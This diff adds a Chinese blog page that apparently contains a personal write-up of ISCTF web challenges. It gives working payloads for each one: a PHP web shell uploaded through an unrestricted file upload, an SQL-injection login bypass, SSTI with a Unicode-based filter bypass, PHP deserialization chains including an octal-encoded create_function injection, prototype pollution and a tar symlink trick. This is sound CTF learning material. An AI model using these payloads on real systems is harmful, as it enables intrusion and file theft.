@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <title>白白毛毛</title>
+  <link rel="stylesheet" href="/css/style.css">
+  <link rel="stylesheet" href="/css/_custom.css">
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body class="bg-post">
+
+<div class="sidebar">
+    <div class="header-info">
+        <a href="/"><img src="/images/avatar.jpg" class="avatar"></a>
+        <div class="site-author">白白毛毛</div>
+    </div>
+    <nav class="nav">
+        <a href="/">首页</a>
+        <a href="/categories">分类</a>
+        <a href="/archives">所有</a>
+    </nav>
+    <div class="contact-section">
+        <p>If you want find me:</p>
+        <div class="contact-item"><img src="/images/qq.png"> 729626523</div>
+        <div class="contact-item"><img src="/images/GitHub.png"> yu-star-cyrene</div>
+        <div class="contact-item"><img src="/images/email.jpg"> y19350026593</div>
+    </div>
+</div>
+
+<div class="content-area">
+    
+<div style="height: 60px;"></div>
+<div class="content-wrapper">
+    <article class="post-article">
+        <h1 style="text-align: center; font-size: 2.2em; margin-bottom: 20px;">ISCTF个人复盘</h1>
+        
+        <div style="text-align: center; color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 20px; font-size: 0.9em;">
+            <span>📅 发布: 2025-12-11</span>
+            <span style="margin: 0 15px;">|</span>
+            <span style="color: #007bff; font-weight: bold;">📝 更新: 2025-12-15</span>
+            
+            
+             <span style="margin: 0 15px;">|</span>
+             📂 知识点
+            
+        </div>
+        
+        <div class="article-content">
+            <p>文章内出现的所有指令和代码都是我现场手敲的。</p>
+<h1 id="WEB：难过的bottle"><a href="#WEB：难过的bottle" class="headerlink" title="#WEB：难过的bottle"></a>#WEB：难过的bottle</h1><p>这一题倒不难，在源码中存在一个黑名单封锁了很多指令字符，只留下了flag，小括号，花括号，单引号，双引号。</p>
+<p>在所有字母被封锁的情况下，根据python3的特性，如果我们在python3中使用Unicode字符，python3会自动帮我们纠正过来。</p>
+<p>而题目的waf却无法封锁这些unicode加粗字符，即我们用一个跟open和read很像的Unicode加粗字母绕过来waf。</p>
+<p>然后执行了<code>&#123;&#123;open('/flag'.read())&#125;&#125;</code>这个指令。</p>
+<hr>
+<h1 id="WEB：b-by-n0t1ce-b0ard"><a href="#WEB：b-by-n0t1ce-b0ard" class="headerlink" title="#WEB：b@by n0t1ce b0ard"></a>#WEB：b@by n0t1ce b0ard</h1><p>这一题是一个已知的漏洞，上网查一下就能明白。</p>
+<p>在注册界面的上传头像处，网站源码并没有对上传的文件做后缀或内容的限制，导致我们直接上传一个php文件，内容为</p>
+<p><code>&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code>  </p>
+<p>就能黑入网站，拿到了控制权，执行我们想要执行的命令。</p>
+<hr>
+<h1 id="WEB：flag到底在哪"><a href="#WEB：flag到底在哪" class="headerlink" title="#WEB：flag到底在哪"></a>#WEB：flag到底在哪</h1><p>这一题显示403，用curl在访问一下，就能发现题目是限制了我们的权限，导致我们无法访问正常页面，猜测一下存在一个注册用户的地方。</p>
+<p>直接访问&#x2F;admin&#x2F;login.php，发现登入点，提示账号为admin，逻辑运算符要大写。</p>
+<p>直接用sql注入，万能密码，’ OR ‘1’&#x3D;1</p>
+<p>登入成功，发现是个web php文件上传页面。</p>
+<p>尝试最简单的，<code>&lt;?php system(&quot;ls -la&quot;); ?&gt;</code> 发现flag并不在当前目录下。</p>
+<p>用 <code>&lt;?php system(&quot;find / -name\&quot;*flag*\&quot;  -type f 2&gt;/dev/null&quot;); ?&gt;</code> 发现一个&#x2F;home&#x2F;flag。</p>
+<p>使用 <code>&lt;?php system(&quot;cat /home/flag&quot;); ?&gt;</code> 直接拿下flag。</p>
+<hr>
+<h1 id="WEB：ezrce"><a href="#WEB：ezrce" class="headerlink" title="#WEB：ezrce"></a>#WEB：ezrce</h1><p>一个简单的php源码，有一个强制我们只能使用字符，小括号等等的preg。</p>
+<p>直接传。</p>
+<p><code>print_r(getcwd());</code> 发现当前目录为html，距离根目录还有3个上级目录。</p>
+<p>直接用<code>scandir</code>和<code>dirname</code>穿越目录， <code>print_r(scandir(dirname(dirname(dirname(getcwd())))));</code></p>
+<p>发现flag就在根目录下。</p>
+<p>用 <code>chdir</code> 切换目录，然后 <code>readfile</code> 拿下flag。</p>
+<p><code>chdir(dirname(dirnanme(dirname(getcwd()))));readflie(flag)；</code></p>
+<hr>
+<h1 id="WEB：来签个到吧"><a href="#WEB：来签个到吧" class="headerlink" title="#WEB：来签个到吧"></a>#WEB：来签个到吧</h1><p>ez的反序列化，观看源码，发现强制post shark&#x3D;blueshar：的数据接收方式。</p>
+<p>根据api.php，检查类型名必须为<code>ShitMountant</code> 类</p>
+<p>然后存在一个<code>fetch</code>的方法用来读取文件。</p>
+<p><code>fetch</code>的读取路径为<code>$url</code> ,此外如果 <code>$logger</code> 如果有值，即调用它的 <code>write</code> 方式。</p>
+<p>为了使反序列化的php代码简易化，</p>
+<p>最终我得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class ShitMountant&#123;</span><br><span class="line">	public $url;</span><br><span class="line">	public $logger;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;url=&#x27;/flag&#x27;;</span><br><span class="line">		$this-&gt;logger=null;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new ShitMountant();</span><br><span class="line">echo serialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>在找个在线php跑一下，得到我们的反序列数据，然后post传参，再让api.php触发这段反序列化，拿下flag。</p>
+<hr>
+<h1 id="WEB：Who-am-I"><a href="#WEB：Who-am-I" class="headerlink" title="#WEB：Who am I"></a>#WEB：Who am I</h1><p>看题目的js，发现存在强制更改type的值，猜测是一个对帐号判断的代码。</p>
+<p>注册账号，用bp抓包登入页面，更改type&#x3D;0，正好进入管理员账号，可以看到后台源码。</p>
+<p>发现两个漏洞点。</p>
+<p>发现存在 <code>pydash.set_(Username,password,confirm_password)</code> 函数可以更改属性。</p>
+<p><code>render_template(point)</code> 渲染html时去 <code>searchpath</code> 寻找文件。</p>
+<p>判断ssti，修改 <code>operate</code> 污染 <code>searchpath</code>。</p>
+<p>使用 <code>/operate?username=app&amp;password=jinja_loader.searchpath&amp;confirm_password=/</code></p>
+<p>污染 <code>search</code> 使其指向根目录 <code>/</code></p>
+<p>随后访问 <code>/impression?point=flag</code></p>
+<p>拿下flag。</p>
+<hr>
+<h1 id="WEB：flag？我就借走了"><a href="#WEB：flag？我就借走了" class="headerlink" title="#WEB：flag？我就借走了"></a>#WEB：flag？我就借走了</h1><p>这一题就是借用了题目python解压tar包保留软链接的方式，创建一个指向&#x2F;flag的软链接，让我们在网站访问软链接时候，误以为我们在访问&#x2F;flag，拿下flag。</p>
+<p>创建link.tar的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import tarfile</span><br><span class="line">def make_link_tar():</span><br><span class="line">    with tarfile.open(&#x27;link.tar&#x27;,&#x27;w&#x27;) as tar :</span><br><span class="line"></span><br><span class="line">        info1=tarfile.TarInfo(&#x27;flag.txt&#x27;)</span><br><span class="line">        info1.type=tarfile.SYMTYPE</span><br><span class="line">        info1.linkname=&#x27;/flag&#x27;</span><br><span class="line">        tar.addfile(info1)</span><br><span class="line"></span><br><span class="line">if __name__==&#x27;__main__&#x27;:</span><br><span class="line">    make_link_tar()</span><br></pre></td></tr></table></figure>
+
+<p>上传tar文件，访问软链接，拿下flag。</p>
+<hr>
+<h1 id="WEB：Bypass"><a href="#WEB：Bypass" class="headerlink" title="#WEB：Bypass"></a>#WEB：Bypass</h1><p>同样的php加反序列化，靶机给了源码。</p>
+<p>有黑名单，禁用几乎所有的指令字符，也就意味着正常命令走不通。</p>
+<p>存在一个 <code>$a(&quot;&quot;, $b);</code>，查询后能发现这个的构造很像 <code>create_function()</code> ，而且正好这个函数不存在于a的黑名单中。</p>
+<p>这个函数的作用是创建一个匿名函数，括号内第一个为参数，第二个为代码。</p>
+<p>思路为命令逃逸，用}闭合前面的函数，然后执行 <code>system(&#39;cat /flag&#39;)</code>; 绕过waf使用的是八进制法，将我们的命令字母转化后八进制通过waf，在通过php解析，完成反序列化攻击。</p>
+<p>payload构造如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class FLAG</span><br><span class="line">&#123;</span><br><span class="line">	public $a;</span><br><span class="line">	public $b;</span><br><span class="line">	public function __construct()</span><br><span class="line">	&#123;</span><br><span class="line">		$this-&gt;a=&quot;create_function&quot;;</span><br><span class="line">		$this-&gt;b=&#x27;&#125; &quot;\163\171\163\164\145\155&quot;(&quot;\143\141\164\40\57\146\154\141\147&quot;);/*&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$payload=new FLAG;</span><br><span class="line">echo urlencode(serialize($payload));</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
+
+        </div>
+    </article>
+</div>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
